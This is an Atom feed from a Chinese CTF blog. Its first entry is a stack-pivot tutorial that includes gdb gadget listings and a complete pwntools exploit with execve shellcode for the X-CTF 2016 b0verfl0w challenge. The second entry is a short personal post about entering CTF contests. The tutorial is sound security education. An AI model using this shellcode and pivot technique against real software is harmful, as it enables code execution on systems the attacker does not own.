<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Shangfute's Blog - ctf</title><link href="http://shangfute.github.com/" rel="alternate"></link><link href="http://shangfute.github.com/feeds/ctf.atom.xml" rel="self"></link><id>http://shangfute.github.com/</id><updated>2017-11-27T19:29:33+08:00</updated><entry><title>劫持栈指针</title><link href="http://shangfute.github.com/Stack-pivot.html" rel="alternate"></link><published>2017-11-27T19:29:33+08:00</published><updated>2017-11-27T19:29:33+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-11-27:/Stack-pivot.html</id><summary type="html">&lt;p&gt;劫持栈指针（Stack pivot）就是改写rsp(esp)，使其指向其他位置。这样栈也就被劫持到攻击者控制的内存上去，然后在该位置做ROP。&lt;/p&gt;
&lt;h2&gt;为什么要劫持栈指针？&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP&lt;/li&gt;
&lt;li&gt;开启了PIE保护，栈地址未知，并且无法泄露，但是利用某些技术（如ret2dl-resolve）时，必须知道栈地址，可以通过stack pivot将栈劫持到相应的区域&lt;/li&gt;
&lt;li&gt;其它漏洞难以利用，stack pivot 能够将一些非栈溢出的漏洞，变成栈溢出的漏洞，例如，将程序劫持到堆空间中。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;利用条件&lt;/h2&gt;
&lt;p&gt;如果在尝试了直接Rop发现比较难实现，并且程序中有可以利用进行读写的函数，就可以考虑stack pivot stack pivot&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以控制程序执行流&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;存在地址已知，内容可控的Buffer&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BSS，由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限&lt;/li&gt;
&lt;li&gt;堆，但是需要我们能够泄露堆地址。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以控制sp指针。一般来说 …&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;劫持栈指针（Stack pivot）就是改写rsp(esp)，使其指向其他位置。这样栈也就被劫持到攻击者控制的内存上去，然后在该位置做ROP。&lt;/p&gt;
&lt;h2&gt;为什么要劫持栈指针？&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP&lt;/li&gt;
&lt;li&gt;开启了PIE保护，栈地址未知，并且无法泄露，但是利用某些技术（如ret2dl-resolve）时，必须知道栈地址，可以通过stack pivot将栈劫持到相应的区域&lt;/li&gt;
&lt;li&gt;其它漏洞难以利用，stack pivot 能够将一些非栈溢出的漏洞，变成栈溢出的漏洞，例如，将程序劫持到堆空间中。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;利用条件&lt;/h2&gt;
&lt;p&gt;如果在尝试了直接Rop发现比较难实现，并且程序中有可以利用进行读写的函数，就可以考虑stack pivot stack pivot&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以控制程序执行流&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;存在地址已知，内容可控的Buffer&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BSS，由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限&lt;/li&gt;
&lt;li&gt;堆，但是需要我们能够泄露堆地址。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ret&lt;/span&gt;
&lt;span class="nf"&gt;jmp&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;
&lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;
&lt;span class="nf"&gt;sub&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb)  x/7i 0x000000000040061a
0x40061a &amp;lt;__libc_csu_init+90&amp;gt;:  pop    rbx
0x40061b &amp;lt;__libc_csu_init+91&amp;gt;:  pop    rbp
0x40061c &amp;lt;__libc_csu_init+92&amp;gt;:  pop    r12
0x40061e &amp;lt;__libc_csu_init+94&amp;gt;:  pop    r13
0x400620 &amp;lt;__libc_csu_init+96&amp;gt;:  pop    r14
0x400622 &amp;lt;__libc_csu_init+98&amp;gt;:  pop    r15
0x400624 &amp;lt;__libc_csu_init+100&amp;gt;: ret
(gdb)  x/7i 0x000000000040061d
0x40061d &amp;lt;__libc_csu_init+93&amp;gt;:  pop    rsp
0x40061e &amp;lt;__libc_csu_init+94&amp;gt;:  pop    r13
0x400620 &amp;lt;__libc_csu_init+96&amp;gt;:  pop    r14
0x400622 &amp;lt;__libc_csu_init+98&amp;gt;:  pop    r15
0x400624 &amp;lt;__libc_csu_init+100&amp;gt;: ret
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;例1：X-CTF Quals 2016 - b0verfl0w&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/NUSGreyhats/xctf-2016-quals-challenges/tree/master/pwn/b0verfl0w"&gt;题目&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;查看程序的安全保护&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img alt="checksec" src="http://shangfute.github.com/images/k64-2017-11-27-21-02-09.png"&gt;&lt;/p&gt;
&lt;p&gt;可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;signed&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;vul&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// [sp+18h] [bp-20h]@1&lt;/span&gt;

  &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;======================&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Welcome to X-CTF 2016!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;======================&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;What&amp;#39;s your name?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Hello %s.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用栈溢出布置shellcode&lt;/li&gt;
&lt;li&gt;控制eip指向shellcode处&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。&lt;/p&gt;
&lt;p&gt;&lt;img alt="gadgets" src="http://shangfute.github.com/images/k64-2017-11-27-21-09-36.png"&gt;&lt;/p&gt;
&lt;p&gt;这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;那么我们payload中的最后一部分改如何设置esp呢，可以知道&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;size(shellcode+padding)=0x20&lt;/li&gt;
&lt;li&gt;size(fake ebp)=0x4&lt;/li&gt;
&lt;li&gt;size(0x08048504)=0x4&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以我们最后一段需要执行的指令就是&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt; &lt;span class="mi"&gt;0x28&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;
&lt;span class="nf"&gt;jmp&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所以最后的exp如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="n"&gt;sh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./b0verfl0w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;shellcode_x86&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;shellcode_x86&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;shellcode_x86&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x0b\xcd\x80&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;sub_esp_jmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sub esp, 0x28;jmp esp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;jmp_esp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x08048504&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;shellcode_x86&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="mh"&gt;0x20&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode_x86&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bbbb&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;jmp_esp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sub_esp_jmp&lt;/span&gt;
&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;例2：EkoPartyCTF 2016 fuckzing-exploit-200&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/ctfs/write-ups-2016/tree/master/ekoparty-ctf-2016/pwning/fuckzing-exploit-200"&gt;题目&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;查看程序的安全保护&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img alt="checksec" src="http://shangfute.github.com/images/k64-2017-11-27-20-30-26.png"&gt;&lt;/p&gt;
&lt;h2&gt;Ref&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others.htmlhttps://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others.html"&gt;stack pivot&lt;/a&gt;&lt;/p&gt;</content><category term="learn"></category><category term="ROP"></category></entry><entry><title></title><link href="http://shangfute.github.com/best-coder-ctf.html" rel="alternate"></link><published>2016-05-19T11:01:49+08:00</published><updated>2016-05-19T11:01:49+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-19:/best-coder-ctf.html</id><summary type="html">&lt;p&gt;之前耀哥问我要不要参加百度之星编程竞赛，其实有一点要参加的想法。但是一方面感觉自己水平太差，那不了什么名次；另一方面还想着时间不够，我其实更想参加CTF。&lt;/p&gt;
&lt;p&gt;其实现在各种竞赛这么多，还有Kaggle、天池什么的都很诱人。但是毕竟人的精力是有限的。我现在希望能够首先集中精力到CTF中。&lt;/p&gt;
&lt;p&gt;想到这里，发现其实我同样没有参加多少CTF，那么何谈精力有限呢。那么我很少参加编程竞赛和很少参加CTF的原因是否其实一样呢。&lt;/p&gt;
&lt;p&gt;那么做个实验吧，下周我要尝试参加所有能够参加的CTF。如果做到了，那么坚持参加CTF。如果没有做到说明，我不能参加竞赛另有原因。我应当尝试找出更深入的原因。&lt;/p&gt;
&lt;p&gt;captf.com&lt;/p&gt;</summary><content type="html">&lt;p&gt;之前耀哥问我要不要参加百度之星编程竞赛，其实有一点要参加的想法。但是一方面感觉自己水平太差，那不了什么名次；另一方面还想着时间不够，我其实更想参加CTF。&lt;/p&gt;
&lt;p&gt;其实现在各种竞赛这么多，还有Kaggle、天池什么的都很诱人。但是毕竟人的精力是有限的。我现在希望能够首先集中精力到CTF中。&lt;/p&gt;
&lt;p&gt;想到这里，发现其实我同样没有参加多少CTF，那么何谈精力有限呢。那么我很少参加编程竞赛和很少参加CTF的原因是否其实一样呢。&lt;/p&gt;
&lt;p&gt;那么做个实验吧，下周我要尝试参加所有能够参加的CTF。如果做到了，那么坚持参加CTF。如果没有做到说明，我不能参加竞赛另有原因。我应当尝试找出更深入的原因。&lt;/p&gt;
&lt;p&gt;captf.com&lt;/p&gt;</content><category term="game"></category><category term="learn"></category></entry></feed>